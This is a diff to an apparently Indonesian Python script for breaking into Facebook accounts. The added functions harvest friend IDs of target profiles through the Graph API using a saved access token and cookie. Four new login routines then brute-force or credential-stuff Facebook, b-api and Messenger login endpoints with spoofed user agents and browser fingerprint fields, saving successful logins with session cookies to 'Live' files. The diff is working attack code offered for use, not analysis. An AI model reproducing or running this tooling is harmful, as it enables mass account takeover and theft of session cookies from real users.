@@ -413,11 +413,11 @@ def login_menu():
              {H2}╰─▶ {B2}03 [bold purple]Clone ID Email  {H2}╰─▶ {B2}00 [bold purple]Exit Program""")
     ___Sllowly_ID____ = input(f'✶ ━━⫸ {H} Input{N} : ')
     if ___Sllowly_ID____ in ['1']:
-        massal()
+        Dump_Massal()
     elif ___Sllowly_ID____ in ['2']:
         print(nel(f'\t\t [bold blue]Publik Crack',width=90, padding=(0, 8), style=f"bold purple"))
         idt = input(f'\n✶ ━━⫸ {H2} Masukkan ID Target  : {m}')
-        dump(idt,"",{"cookie":cok},token)
+        dump1(idt,"",{"cookie":cok},token)
         setting()
     elif ___Sllowly_ID____ in ['3']:
 	    mail2()
@@ -468,6 +468,41 @@ def dump(idt,fields,cookie,token):
 			#print(i["id"]+"|"+i["name"])
 			id.append(i["id"]+"|"+i["name"])
 			sys.stdout.write(f"\r>> {M}sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....\n"),
+			sys.stdout.flush()
+		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
+	except:pass
+
+###-----[ DUMP OTOMATIS ]-----###
+def dump1(idt,fields,cookie,token):
+	try:
+		headers = {
+			"connection": "keep-alive", 
+			"accept": "*/*", 
+			"sec-fetch-dest": "empty", 
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin", 
+			"sec-fetch-user": "?1",
+			"sec-ch-ua-mobile": "?1",
+			"upgrade-insecure-requests": "1", 
+			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
+			"accept-encoding": "gzip, deflate",
+			"accept-language": "id-ID,id;q=0.9"
+		}
+		if len(id) == 0:
+			params = {
+				"access_token": token,
+				"fields": f"name,friends.fields(id,name,birthday)"
+			}
+		else:
+			params = {
+				"access_token": token,
+				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
+			}
+		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
+		for i in url["friends"]["data"]:
+			#print(i["id"]+"|"+i["name"])
+			id.append(i["id"]+"|"+i["name"])
+			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
 			sys.stdout.flush()
 		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
 	except:pass
@@ -858,6 +893,48 @@ def massal():
 	    exit()
 	except (KeyError,IOError):
 		exit()
+###-----[ DUMP PUBLIK MASSAL ]-----###
+def Dump_Massal():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		print(f"\n>>> pastikan id target tidak private/publik.")
+		jum = int(input(f'>>> input jumlah target ? : '))
+	except ValueError:
+		print(f'>>> input salah ')
+		exit()
+	if jum<1 or jum>100:
+		print(f'>>> gagal dump id kemungkinan id bukan publik/private ')
+		exit()
+	ses=requests.Session()
+	jumlah_input = 0
+	for met in range(jum):
+		jumlah_input+=1
+		user_dump = input(f'>>> input id ke '+str(jumlah_input)+' : ')
+		uid.append(user_dump)
+	for userr in uid:
+		try:
+			col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
+			for x in col['friends']['data']:
+				try:
+					sys.stdout.write(f"\r>>> sedang mengumpulkan id, sukses mengumpulkan {len(id)} id...."),
+					sys.stdout.flush()
+					id.append(x['id']+'|'+x['name'])
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			print(f'  - koneksi sinyal tidak stabil ')
+			exit()
+	try:
+		setting()
+	except requests.exceptions.ConnectionError:
+		print('')
+		print(f'  - koneksi sinyal tidak stabil ')
+		back()
 ###----------[ ATUR SBLUM KREK ]----------###
 def setting():
 	cetak(nel(f"                        [bold blue]login ID Crack", title=f"{asu}{len(id)}{M2} ID TELAH DIKUMPULKAN", style=f"bold purple"))
@@ -956,13 +1033,15 @@ def passwrd():
 					pwv.append(xpwd)
 			else:pass
 			if 'metod1' in method:
-				pool.submit(rr071,idf,pwv)
+				pool.submit(_validate_,uid,pasw)
 			elif 'metod2' in method:
-				pool.submit(rr072,idf,pwv)
+				pool.submit(_async_,uid,pasw)
 			elif 'metod3' in method:
-				pool.submit(rr073,idf,pwv)
+				pool.submit(_api_,uid,pasw)
+			elif 'metod4' in method:
+				pool.submit(_messenger_,uid,pasw)
 			else:
-				pool.submit(rr071,idf,pwv)
+				pool.submit(_validate_,uid,pasw)
 	print('')
 	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
@@ -1255,6 +1334,180 @@ def rr073(idf,pwv):
 				continue
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
+	loop+=1
+###-----[ METODE VALIDATE ]-----###
+def _validate_(uid,pasw):
+	global loop,ok,cp
+	sys.stdout.write(f"\r{P}>>> {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
+	sys.stdout.flush()
+	ses = requests.Session()
+	for pw in pasw:
+		try:
+			if 'uadia' in uadarimu: ua = uadia[0]
+			else:ua = ugen()
+			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
+			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"uid": uid,"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified","flow": "login_no_pin","pass": pw}
+			hd = {"Host": "free.prod.facebook.com","content-length": "479","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.prod.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.opera.mini.native","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			post = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=hd, allow_redirects=False)
+			if "c_user" in ses.cookies.get_dict():
+				ok+=1
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f"\r{P}>>> {H}{uid}|{pw} ---> OK{P}")
+				print(f"\r{P}>>> {H}{kuki};{ua}{P}")
+				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
+				break
+			elif "checkpoint" in ses.cookies.get_dict():
+				cp+=1
+				print(f"\r{P}>>> {K}{uid}|{pw} ---> CP{P}")
+				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(15)
+	loop+=1
+###-----[ METODE ASYNC ]-----###
+def _async_(uid,pasw):
+	global loop,ok,cp
+	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
+	sys.stdout.flush()
+	ses = requests.Session()
+	for pw in pasw:
+		try:
+			if 'uadia' in uadarimu: ua = uadia[0]
+			else:ua = ugen()
+			versi = re.search('Chrome/(\d+).', str(ua)).group(1)
+			versi2 = f".0.{str(rr(1111,5999))}.{str(rr(45,150))}"
+			link = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+			data = {"m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),"li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),"try_number": re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),"email": uid,"prefill_contact_point": uid,"prefill_source": "browser_dropdown","prefill_type": "password","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": "true","had_password_prefilled": "true","is_smart_lock": "false","bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),"bi_wvdp": str('{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}'),"pass": pw,"fb_dtsg":"","jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)}
+			hd2 = {"Host": "m.facebook.com","content-length": "2138","sec-ch-ua": '"Not/A)Brand";v="99", "Samsung Internet";v="23.0", "Chromium";v="%s"'%(versi),"sec-ch-ua-mobile": "?1","user-agent": ua,"viewport-width": "421","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"sec-ch-ua-platform-version": '"10.0.0"',"x-asbd-id": "129477","dpr": "2.56875","sec-ch-ua-full-version-list": '"Not/A)Brand";v="99.0.0.0", "Samsung Internet";v="23.0.0.47", "Chromium";v="%s%s"'%(versi,versi2),"sec-ch-ua-model": '"Redmi Note 7"',"sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://m.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			ses.post("https://m.facebook.com/login/device-based/login/async/?api_key=190291501407&auth_token=563a4d0ad69493ce0947d19e95df8085&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&refsrc=deprecated&app_id=190291501407&cancel=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&lwv=100",data=data, headers=hd2, allow_redirects=False)
+			if "c_user" in ses.cookies.get_dict():
+				ok+=1
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
+				print(f"\r{P}  - {H}{kuki};{ua}{P}")
+				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
+				break
+			elif "checkpoint" in ses.cookies.get_dict():
+				cp+=1
+				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
+				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(15)
+	loop+=1
+###-----[ METODE API ]-----###
+def _api_(uid,pasw):
+	global loop,ok,cp,a2f
+	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P} A2F-:{M}{a2f}{P}"),
+	sys.stdout.flush()
+	ses = requests.Session()
+	for pw in pasw:
+		try:
+			if 'uadia' in uadarimu: ua = uadia[0]
+			else:ua = api()
+			headers_ = {"x-fb-connection-bandwidth": str(rr(20000000.0, 30000000.0)), "x-fb-sim-hni": str(rr(20000, 40000)), "x-fb-net-hni": str(rr(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': str(rr(2,31)), 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
+			response = ses.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers_)
+			xxx = json.loads(response.text)
+			if 'access_token' in response.text and 'EAAA' in response.text:
+				ok+=1
+				coki = xxx["session_cookies"]
+				cok = {}
+				for x in coki:
+					cok.update({x["name"]:x["value"]})
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
+				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
+				print(f"\r{P}  - {H}{kuki}{P}")
+				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
+				break
+			elif 'www.facebook.com' in response.json()['error_msg']:
+				cp+=1
+				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
+				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
+				break
+			elif 'Login approvals' in response.json()['error_msg']:
+				a2f+=1
+				print(f"\r{P}  - {M}{uid}|{pw} ---> A2F{P}")
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(15)
+	loop+=1
+###-----[ METODE MESSENGER ]-----###
+def _messenger_(uid,pasw):
+	global loop,ok,cp
+	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
+	sys.stdout.flush()
+	ses = requests.Session()
+	while True:
+		try:
+			if 'uadia' in uadarimu: ua = uadia[0]
+			else:ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+			headers = {
+             "Host": "www.messenger.com",
+             "Connection": "keep-alive",
+             "Content-Length": "267",
+             "Cache-Control": "max-age=0",
+             "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
+             "sec-ch-ua-mobile": "?0",
+             "sec-ch-ua-platform": '"Linux"',
+             "Upgrade-Insecure-Requests": "1",
+             "Origin": "https://www.messenger.com",
+             "Content-Type": "application/x-www-form-urlencoded",
+             "User-Agent": ua,
+             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+             "Sec-Fetch-Site": "same-origin",
+             "Sec-Fetch-Mode": "navigate",
+             "Sec-Fetch-User": "?1",
+             "Sec-Fetch-Dest": "document",
+             "Referer": "https://www.messenger.com/",
+             "Accept-Encoding": "gzip, deflate, br",
+             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
+			}
+			reqs = ses.get("https://www.messenger.com/").text
+			datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
+			data = {
+             "jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),
+             "lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),
+             "initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),
+             "timezone":"-420",
+             "lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),
+             "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),
+             "lgnjs":"n",
+             "email":uid,
+             "pass":"Sungkem Puh Sepuhh",
+             "login":"1",
+             "persistent":"1",
+             "default_persistent":""
+			}
+			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
+			break
+		except:pass
+	for pw in pasw:
+		try:
+			data.update({"pass":"".join(pw)})
+			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)
+			if "c_user" in ses.cookies.get_dict():
+				kuki = (';').join(["%s=%s"%(name,value) for name,value in ses.cookies.get_dict().items()]) + headers.get('Cookie').replace(' ','')
+				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
+				print(f"\r{P}  - {H}{kuki}{P}")
+				ok +=1
+				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
+				break
+			elif "www.facebook.com%2Fcheckpoint" in response.headers.get('Location'):
+				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
+				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
+				cp+=1
+				break
+			else:continue
+		except (requests.exceptions.ConnectionError):
+			time.sleep(15)
+		except:pass
 	loop+=1
 #----------------------[ CEK-APLIKASI ]---------------------#
 cka = 'cek_apk(session,cookie)'
